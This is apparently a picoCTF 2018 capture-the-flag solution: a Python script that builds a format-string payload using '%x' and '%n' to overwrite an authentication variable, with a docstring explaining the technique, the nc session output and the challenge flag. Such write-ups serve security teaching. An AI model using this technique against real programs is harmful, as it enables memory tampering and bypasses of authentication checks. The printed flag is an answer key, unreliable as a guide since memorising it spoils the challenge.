import struct

address = struct.pack("I", 0x804a04c)
payload = address + "." + "%x."*10 + ".%n";
print(payload)

"""
If our input is not "yes" or "no", then we are able to access a format string vulnerability.
We need to use this to overwrite the authenticated variable with any number greater than zero so
that we can read the flag. To do this, we can use the %n format string operator which allows us to overwrite the value of an address with
the number of bytes we printed so far.

$ python solution.py | nc 2018shell3.picoctf.com 27114
Would you like to read the flag? (yes/no)
Received Unknown Input:

.80489a6.f77345a0.804875a.f776b000.f776b918.ffdd4320.ffdd4414.0.ffdd43b4.42b..
Access Granted.
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_742b49a4}
"""
